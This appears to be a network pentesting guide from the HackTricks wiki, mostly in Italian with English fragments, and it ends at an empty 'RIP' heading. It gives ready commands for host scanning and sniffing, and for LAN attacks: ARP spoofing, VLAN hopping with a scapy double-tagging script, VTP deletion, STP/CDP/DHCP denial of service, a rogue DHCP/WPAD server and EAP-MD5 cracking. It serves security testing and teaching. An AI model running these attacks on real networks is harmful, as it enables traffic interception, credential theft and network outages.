# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Scoperta degli host dall'esterno

Questa sarà una **sezione breve** su come trovare **IPs che rispondono** da **Internet**.\
In questa situazione hai un **scope di IPs** (forse anche diversi **ranges**) e devi solo trovare **quali IPs stanno rispondendo**.

### ICMP

Questo è il modo più **semplice** e **veloce** per scoprire se un host è attivo o meno.\
Puoi provare a inviare dei pacchetti **ICMP** e **aspettarti risposte**. Il modo più semplice è inviare un **echo request** e aspettare la risposta. Puoi farlo usando un semplice `ping` o `fping` per i **ranges**.\
Puoi anche usare **nmap** per inviare altri tipi di pacchetti ICMP (questo eviterà i filtri al comune ICMP echo request-response).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port Discovery

È molto comune trovare che ogni tipo di pacchetto ICMP venga filtrato. Quindi, tutto quello che puoi fare per verificare se un host è up è **provare a trovare open ports**. Ogni host ha **65535 ports**, quindi, se hai uno scope "grande" non puoi testare se **each port** di ogni host sia open o no, ci vorrebbe troppo tempo.\
Quello che ti serve è un **fast port scanner** ([masscan](https://github.com/robertdavidgraham/masscan)) e una lista delle **ports più usate:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Puoi anche eseguire questo passaggio con `nmap`, ma è più lento e a volte `nmap` ha problemi a identificare gli host attivi.

### Rilevamento porte HTTP

Questo è semplicemente un rilevamento delle porte TCP utile quando vuoi **concentrarti nel trovare** **servizi HTTP**:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port Discovery

Potresti anche provare a controllare se ci sono delle **UDP port open** per decidere se dovresti **pay more attention** a un **host.** Poiché i servizi UDP solitamente **don't respond** con **any data** a un normale pacchetto di probe UDP vuoto, è difficile stabilire se una porta sia filtrata o open. Il modo più semplice per deciderlo è inviare un pacchetto relativo al servizio in esecuzione; e poiché non sai quale servizio sia in esecuzione, dovresti provare quello più probabile in base al numero di porta:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
La riga di nmap proposta prima testerà le **top 1000 UDP ports** in ogni host all'interno della **/24** range ma anche solo questo richiederà **>20min**. Se hai bisogno di **risultati più rapidi** puoi usare [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner): `./udp-proto-scanner.pl 199.66.11.53/24` Questo invierà queste **UDP probes** alla loro **expected port** (per una /24 range questo impiegherà solo 1 min): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port Discovery
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Pentesting Wifi

Here you can find a nice guide of all the well known Wifi attacks at the time of the writing:


{{#ref}}
../pentesting-wifi/
{{#endref}}

## Scoprire hosts dall'interno

Se ti trovi all'interno della network, una delle prime cose che vorrai fare è **scoprire altri hosts**. A seconda di **quanto rumore** puoi/vuoi generare, si possono eseguire azioni diverse:

### Passivo

Puoi usare questi strumenti per scoprire in modo passivo hosts all'interno di una network connessa:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Attivo

Nota che le tecniche commentate in [_**Discovering hosts from the outside**_](#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port Discovery_) possono essere anche **applicate qui**.\
Ma, essendo nella **stessa rete** degli altri host, puoi fare **più cose**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

Nota che le tecniche commentate in _Discovering hosts from the outside_ ([_**ICMP**_](#icmp)) possono essere anche **applicate qui**.\
Però, dato che sei nella **stessa network** degli altri host, puoi fare **più cose**:

- Se esegui un **ping** a un **indirizzo broadcast della subnet** il ping dovrebbe arrivare a **ogni host** e potrebbero **rispondere** a **te**: `ping -b 10.10.5.255`
- Pingando l'**indirizzo broadcast di rete** potresti anche trovare host all'interno di **altre subnet**: `ping -b 255.255.255.255`
- Usa le opzioni `-PE`, `-PP`, `-PM` di `nmap` per eseguire la scoperta degli host inviando rispettivamente **ICMPv4 echo**, **timestamp**, e **subnet mask requests:** `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan è usato per **accendere** i computer tramite un **messaggio di rete**. Il magic packet usato per accendere il computer è semplicemente un pacchetto in cui viene fornito un **MAC Dst** e poi questo viene **ripetuto 16 volte** all'interno dello stesso pacchetto.\
Questo tipo di pacchetti viene solitamente inviato in un **ethernet 0x0842** o in un **pacchetto UDP verso la porta 9**.\
Se **non viene fornito alcun \[MAC]**, il pacchetto viene inviato all'**broadcast ethernet** (e la MAC di broadcast sarà quella ripetuta).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0842
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Scansione Hosts

Una volta che hai scoperto tutti gli IP (esterni o interni) che vuoi scansionare in profondità, possono essere eseguite diverse azioni.

### TCP

- **Porta aperta**: _SYN --> SYN/ACK --> RST_
- **Porta chiusa**: _SYN --> RST/ACK_
- **Porta filtrata**: _SYN --> \[NO RESPONSE]_
- **Porta filtrata**: _SYN --> messaggio ICMP_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Ci sono 2 opzioni per scansionare una porta UDP:

- Inviare un **pacchetto UDP** e controllare la risposta _**ICMP unreachable**_ se la porta è **chiusa** (in diversi casi l'ICMP sarà **filtrato**, quindi non riceverai alcuna informazione se la porta è chiusa o aperta).
- Inviare **datagrammi formattati** per provocare una risposta da un **servizio** (es., DNS, DHCP, TFTP e altri, come elencato in _nmap-payloads_). Se ricevi una **risposta**, allora la porta è **aperta**.

**Nmap** combinerà entrambe le opzioni usando "-sV" (le scansioni UDP sono molto lente), ma nota che le scansioni UDP sono più lente delle scansioni TCP:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP Scan

**SCTP (Stream Control Transmission Protocol)** è progettato per essere usato insieme a **TCP (Transmission Control Protocol)** e **UDP (User Datagram Protocol)**. Il suo scopo principale è facilitare il trasporto di dati di telefonia sulle reti IP, rispecchiando molte delle caratteristiche di affidabilità presenti in **Signaling System 7 (SS7)**. **SCTP** è un componente centrale della famiglia di protocolli **SIGTRAN**, che mira a trasportare i segnali SS7 su reti IP.

Il supporto per **SCTP** è fornito da vari sistemi operativi, come **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, e **VxWorks**, indicando la sua ampia accettazione e utilità nel campo delle telecomunicazioni e del networking.

Due diverse scansioni per SCTP sono offerte da nmap: _-sY_ e _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### Evasione IDS e IPS


{{#ref}}
ids-evasion.md
{{#endref}}

### **Altre opzioni di nmap**


{{#ref}}
nmap-summary-esp.md
{{#endref}}

### Rivelare indirizzi IP interni

**Router, firewall e dispositivi di rete mal configurati** a volte rispondono alle sonde di rete usando **indirizzi sorgente non pubblici**. **tcpdump** può essere utilizzato per identificare i pacchetti ricevuti da indirizzi privati durante i test. In particolare, su Kali Linux i pacchetti possono essere catturati sull'**interfaccia eth2**, che è accessibile da Internet pubblico. È importante notare che se la tua configurazione è dietro un NAT o un Firewall, tali pacchetti probabilmente verranno filtrati.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing

Con Sniffing puoi apprendere dettagli sugli intervalli IP, le dimensioni delle subnet, gli indirizzi MAC e i nomi host esaminando frame e pacchetti catturati. Se la rete è mal configurata o lo switching fabric è sotto stress, gli attaccanti possono catturare materiale sensibile tramite sniffing passivo della rete.

Se una switched Ethernet network è configurata correttamente, vedrai solo broadcast frames e materiale destinato al tuo indirizzo MAC.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
È inoltre possibile catturare pacchetti da una macchina remota tramite una sessione SSH utilizzando Wireshark come GUI in tempo reale.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

Ovviamente.

### Cattura credentials

Puoi usare strumenti come [https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) per estrarre credentials da un pcap o da un'interfaccia live.

## Attacchi LAN

### ARP spoofing

ARP Spoofing consiste nell'inviare gratuitous ARPResponses per indicare che l'IP di una macchina ha il MAC del nostro dispositivo. La victim aggiornerà la tabella ARP e contatterà la nostra macchina ogni volta che vorrà contattare l'IP spoofed.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM overflow

Sovraccaricare la CAM table dello switch inviando molti packets con diversi source mac address. Quando la CAM table è piena, lo switch inizia a comportarsi come un hub (broadcasting di tutto il traffico).
```bash
macof -i <interface>
```
Negli switch moderni questa vulnerabilità è stata corretta.

### 802.1Q VLAN / DTP Attacks

#### Dynamic Trunking

Il **Dynamic Trunking Protocol (DTP)** è progettato come un protocollo del livello di collegamento per facilitare un sistema automatico di trunking, permettendo agli switch di selezionare automaticamente le porte per la modalità trunk (Trunk) o non-trunk. L'uso di **DTP** è spesso indicativo di una progettazione di rete non ottimale, sottolineando l'importanza di configurare manualmente i trunk solo dove necessario e di mantenere una documentazione adeguata.

Per impostazione predefinita, le porte dello switch sono configurate per operare in Dynamic Auto mode, il che significa che sono pronte a iniziare il trunking se sollecitate da uno switch vicino. Un problema di sicurezza si presenta quando un pentester o un attaccante si connette allo switch e invia un DTP Desirable frame, costringendo la porta a passare in trunk mode. Questa azione permette all'attaccante di enumerare le VLAN analizzando i frame STP e di eludere la segmentazione VLAN creando interfacce virtuali.

La presenza di DTP in molti switch di default può essere sfruttata dagli avversari per imitare il comportamento di uno switch, ottenendo così accesso al traffico su tutte le VLAN. Lo script [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) viene utilizzato per monitorare un'interfaccia, rivelando se uno switch è in Default, Trunk, Dynamic, Auto o Access mode — quest'ultima è l'unica configurazione immune agli attacchi di VLAN hopping. Questo strumento valuta lo stato di vulnerabilità dello switch.

Se viene identificata una vulnerabilità di rete, lo strumento _**Yersinia**_ può essere impiegato per "enable trunking" tramite il protocollo DTP, permettendo l'osservazione dei pacchetti provenienti da tutte le VLAN.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

Per enumerare le VLAN è anche possibile generare il DTP Desirable frame con lo script [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)**. **N**on interrompere lo script in nessun caso. Inietta DTP Desirable ogni tre secondi. I trunk channels creati dinamicamente sullo switch durano solo cinque minuti. Dopo cinque minuti, il trunk viene rimosso.
```
sudo python3 DTPHijacking.py --interface eth0
```
Vorrei sottolineare che **Access/Desirable (0x03)** indica che il frame DTP è di tipo Desirable, il che dice alla porta di passare in Trunk mode. E **802.1Q/802.1Q (0xa5**) indica il tipo di incapsulamento **802.1Q**.

Analizzando i frame STP, **scopriamo l'esistenza di VLAN 30 e VLAN 60.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### Attaccare VLAN specifiche

Una volta che conosci gli ID VLAN e i valori IP, puoi **configurare un'interfaccia virtuale per attaccare una VLAN specifica**.\
Se DHCP non è disponibile, usa _ifconfig_ per impostare un indirizzo IP statico.

<details>
<summary>VLAN interface configuration (example)</summary>
```bash
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```
</details>
```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

L'attacco discusso di **Dynamic Trunking and creating virtual interfaces an discovering hosts inside** all'interno di altre VLAN viene **eseguito automaticamente** dallo strumento: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

Se un attacker conosce il valore di **MAC, IP and VLAN ID of the victim host**, potrebbe provare a **double tag a frame** con la VLAN designata e la VLAN del victim e inviare un pacchetto. Poiché il **victim won't be able to connect back** con l'attacker, la **best option for the attacker is communicate via UDP** verso protocolli che possono eseguire azioni interessanti (like SNMP).

Another option for the attacker is to launch a **TCP port scan spoofing an IP controlled by the attacker and accessible by the victim** (probabilmente attraverso internet). Poi, l'attacker potrebbe sniff sul secondo host di sua proprietà se riceve alcuni pacchetti dal victim.

![](<../../images/image (190).png>)

Per eseguire questo attacco puoi usare scapy: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

Se hai **accesso a uno switch a cui sei direttamente connesso**, hai la possibilità di **bypass VLAN segmentation** all'interno della rete. Semplicemente **imposta la porta in trunk mode** (nota anche come trunk), crea interfacce virtuali con gli ID delle VLAN target e configura un indirizzo IP. Puoi provare a richiedere l'indirizzo dinamicamente (DHCP) oppure configurarlo staticamente. Dipende dal caso.


{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

In alcuni ambienti, come le reti wireless per ospiti, sono implementate impostazioni di **port isolation (also known as private VLAN)** per impedire ai client connessi a un access point wireless di comunicare direttamente tra loro. Tuttavia, è stata identificata una tecnica che può aggirare queste misure di isolamento. Questa tecnica sfrutta la mancanza di network ACLs o la loro errata configurazione, permettendo a pacchetti IP di essere instradati tramite un router per raggiungere un altro client sulla stessa rete.

L'attacco viene eseguito creando un **pacchetto che contiene l'indirizzo IP del client di destinazione ma con il MAC address del router**. Questo porta il router a inoltrare erroneamente il pacchetto al client target. L'approccio è simile a quello utilizzato nelle Double Tagging Attacks, dove la possibilità di controllare un host accessibile alla vittima viene sfruttata per sfruttare la vulnerabilità.

**Passaggi chiave dell'attacco:**

1. **Creazione del pacchetto:** Viene costruito un pacchetto appositamente per includere l'indirizzo IP del client target ma con il MAC address del router.
2. **Sfruttamento del comportamento del router:** Il pacchetto costruito viene inviato al router che, a causa della configurazione, lo reindirizza al client target, bypassando l'isolamento fornito dalle impostazioni di private VLAN.

### VTP Attacks

VTP (VLAN Trunking Protocol) centralizza la gestione delle VLAN. Utilizza numeri di revisione per mantenere l'integrità del database VLAN; ogni modifica incrementa questo numero. Gli switch adottano le configurazioni con numeri di revisione più alti, aggiornando i propri database VLAN.

#### VTP Domain Roles

- **VTP Server:** Gestisce le VLAN—crea, elimina, modifica. Propaga VTP announcements ai membri del dominio.
- **VTP Client:** Riceve VTP announcements per sincronizzare il proprio database VLAN. Questo ruolo è limitato e non può modificare localmente la configurazione VLAN.
- **VTP Transparent:** Non partecipa agli aggiornamenti VTP ma inoltra i VTP announcements. Non è influenzato dagli attacchi VTP e mantiene un numero di revisione costante pari a zero.

#### VTP Advertisement Types

- **Summary Advertisement:** Broadcastato dal VTP server ogni 300 secondi, trasportando le informazioni essenziali del dominio.
- **Subset Advertisement:** Inviato a seguito di modifiche alla configurazione delle VLAN.
- **Advertisement Request:** Emesso da un VTP client per richiedere un Summary Advertisement, tipicamente in risposta al rilevamento di un numero di revisione di configurazione più alto.

Le vulnerabilità VTP sono sfruttabili esclusivamente tramite trunk ports, poiché i VTP announcements circolano unicamente su di essi. In scenari post-DTP attack l'attenzione può spostarsi verso VTP. Strumenti come Yersinia possono facilitare attacchi VTP, con l'obiettivo di cancellare il VLAN database, interrompendo di fatto la rete.

Nota: Questa discussione si riferisce a VTP version 1 (VTPv1).
```bash
yersinia -G # Launch Yersinia in graphical mode
```
Nella modalità grafica di Yersinia, scegli l'opzione deleting all VTP vlans per svuotare il database VLAN.

### Attacchi STP

**Se non riesci a catturare frame BPDU sulle tue interfacce, è improbabile che tu riesca in un attacco STP.**

#### **STP BPDU DoS**

L'invio di molti BPDUs TCP (Topology Change Notification) o Conf (i BPDUs inviati quando la topologia viene creata) sovraccarica gli switch che smettono di funzionare correttamente.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP Attack**

Quando viene inviato un TCP, la CAM table degli switches verrà cancellata in 15s. Quindi, se invii continuamente questo tipo di packets, la CAM table verrà riavviata continuamente (o ogni 15segs) e quando viene riavviata, lo switch si comporta come un hub.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP Root Attack**

L'attaccante simula il comportamento di uno switch per diventare lo STP root della rete. In questo modo, più traffico passerà attraverso di lui. Questo è interessante quando sei connesso a due switch diversi.\
Questo avviene inviando pacchetti BPDUs CONF che dichiarano che il valore **priority** è inferiore alla priority effettiva dello switch root attuale.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**Se l'attacker è connesso a 2 switch può diventare il root del nuovo albero e tutto il traffico tra quegli switch passerà attraverso di lui** (verrà eseguito un MITM attack).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Attacks

CISCO Discovery Protocol (CDP) è essenziale per la comunicazione tra dispositivi CISCO, permettendo loro di **identificarsi reciprocamente e condividere dettagli di configurazione**.

#### Passive Data Collection <a href="#id-0e0f" id="id-0e0f"></a>

CDP è configurato per trasmettere informazioni su tutte le porte, il che può comportare un rischio per la sicurezza. Un attaccante, collegandosi a una porta dello switch, potrebbe utilizzare sniffers di rete come **Wireshark**, **tcpdump**, o **Yersinia**. Questa azione può rivelare dati sensibili sul dispositivo di rete, incluso il suo modello e la versione di Cisco IOS in uso. L'attaccante potrebbe quindi mirare a vulnerabilità specifiche nella versione di Cisco IOS identificata.

#### Inducing CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

Un approccio più aggressivo prevede il lancio di un attacco Denial of Service (DoS) sovraccaricando la memoria dello switch, fingendo di essere dispositivi CISCO legittimi. Di seguito la sequenza di comandi per avviare un tale attacco usando Yersinia, un tool di rete progettato per il testing:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Durante questo attacco, la CPU dello switch e la tabella dei neighbor CDP vengono fortemente sovraccaricate, causando quella che spesso viene definita **“paralisi della rete”** a causa dell'eccessivo consumo di risorse.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
You could also use [**scapy**](https://github.com/secdev/scapy/). Be sure to install it with `scapy/contrib` package.

### Attacchi VoIP e lo strumento VoIP Hopper

I telefoni VoIP, sempre più integrati con dispositivi IoT, offrono funzionalità come lo sblocco delle porte o il controllo dei termostati tramite numeri telefonici speciali. Tuttavia, questa integrazione può comportare rischi per la sicurezza.

The tool [**voiphopper**](http://voiphopper.sourceforge.net) is designed to emulate a VoIP phone in various environments (Cisco, Avaya, Nortel, Alcatel-Lucent). It discovers the voice network's VLAN ID using protocols like CDP, DHCP, LLDP-MED, and 802.1Q ARP.

**VoIP Hopper** offers three modes for the Cisco Discovery Protocol (CDP):

1. **Sniff Mode** (`-c 0`): Analizza i pacchetti di rete per identificare l'ID VLAN.
2. **Spoof Mode** (`-c 1`): Genera pacchetti personalizzati che imitano quelli di un vero dispositivo VoIP.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Invia pacchetti identici a quelli di uno specifico modello di telefono IP Cisco.

La modalità preferita per velocità è la terza. Richiede di specificare:

- L'interfaccia di rete dell'attaccante (`-i` parameter).
- Il nome del dispositivo VoIP da emulare (`-E` parameter), seguendo il formato di denominazione Cisco (es. SEP seguito da un MAC address).

In ambienti corporate, per mimare un dispositivo VoIP esistente si può:

- Ispezionare l'etichetta MAC sul telefono.
- Navigare nelle impostazioni del display del telefono per vedere le informazioni sul modello.
- Collegare il dispositivo VoIP a un laptop e osservare le richieste CDP con Wireshark.

An example command to execute the tool in the third mode would be:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Attacchi

#### Enumerazione
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Due tipi di DoS** possono essere eseguiti contro i server DHCP. Il primo consiste nel **simulare un numero sufficiente di host falsi per usare tutti gli indirizzi IP possibili**.\
Questo attacco funzionerà solo se puoi vedere le risposte del server DHCP e completare il protocollo (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Per esempio, questo **non è possibile nelle reti Wifi**.

Un altro modo per effettuare un DHCP DoS è inviare un **DHCP-RELEASE packet usando come indirizzo sorgente ogni possibile IP**. Poi, il server penserà che tutti abbiano terminato di usare l'IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Un modo più automatico per farlo è utilizzare lo strumento [DHCPing](https://github.com/kamorin/DHCPig)

Puoi usare gli DoS menzionati per costringere i client a ottenere nuovi lease all'interno dell'ambiente e sfiancare i server legittimi in modo che diventino non reattivi. Così quando i client legittimi tenteranno di riconnettersi, **puoi fornire valori malevoli menzionati nel prossimo attacco**.

#### Imposta valori malevoli

Un server DHCP rogue può essere impostato usando lo script DHCP situato in `/usr/share/responder/DHCP.py`. Questo è utile per attacchi di rete, come la cattura del traffico HTTP e delle credenziali, reindirizzando il traffico verso un server malevolo. Tuttavia, impostare un gateway rogue è meno efficace poiché permette solo di catturare il traffico in uscita dal client, perdendo le risposte dal gateway reale. Invece, è raccomandato impostare un server DNS o WPAD rogue per un attacco più efficace.

Below are the command options for configuring the rogue DHCP server:

- **Our IP Address (Gateway Advertisement)**: Use `-i 10.0.0.100` to advertise your machine's IP as the gateway.
- **Local DNS Domain Name**: Optionally, use `-d example.org` to set a local DNS domain name.
- **Original Router/Gateway IP**: Use `-r 10.0.0.1` to specify the IP address of the legitimate router or gateway.
- **Primary DNS Server IP**: Use `-p 10.0.0.100` to set the IP address of the rogue DNS server you control.
- **Secondary DNS Server IP**: Optionally, use `-s 10.0.0.1` to set a secondary DNS server IP.
- **Netmask of Local Network**: Use `-n 255.255.255.0` to define the netmask for the local network.
- **Interface for DHCP Traffic**: Use `-I eth1` to listen for DHCP traffic on a specific network interface.
- **WPAD Configuration Address**: Use `-w “http://10.0.0.100/wpad.dat”` to set the address for WPAD configuration, assisting in web traffic interception.
- **Spoof Default Gateway IP**: Include `-S` to spoof the default gateway IP address.
- **Respond to All DHCP Requests**: Include `-R` to make the server respond to all DHCP requests, but be aware that this is noisy and can be detected.

Usando correttamente queste opzioni, un server DHCP rogue può essere stabilito per intercettare efficacemente il traffico di rete.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **Attacchi EAP**

Ecco alcune delle tattiche di attacco che possono essere usate contro implementazioni 802.1X:

- Brute-force attivo delle password tramite EAP
- Attaccare il server RADIUS con contenuto EAP malformato _\*\*_(exploits)
- Cattura dei messaggi EAP e cracking offline delle password (EAP-MD5 e PEAP)
- Forzare l'autenticazione EAP-MD5 per bypassare la validazione del certificato TLS
- Iniettare traffico di rete malevolo al momento dell'autenticazione usando un hub o simili

Se l'attaccante si trova tra la vittima e il server di autenticazione, potrebbe provare a degradare (se necessario) il protocollo di autenticazione a EAP-MD5 e catturare il tentativo di autenticazione. Poi, potrebbe effettuare un brute-force su questo usando:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) è una classe di protocolli di rete progettata per **creare un sistema di routing ridondante attivo**. Con FHRP, router fisici possono essere combinati in un unico dispositivo logico, aumentando la tolleranza ai guasti e aiutando a distribuire il carico.

**Gli ingegneri di Cisco Systems hanno sviluppato due protocolli FHRP, GLBP e HSRP.**


{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

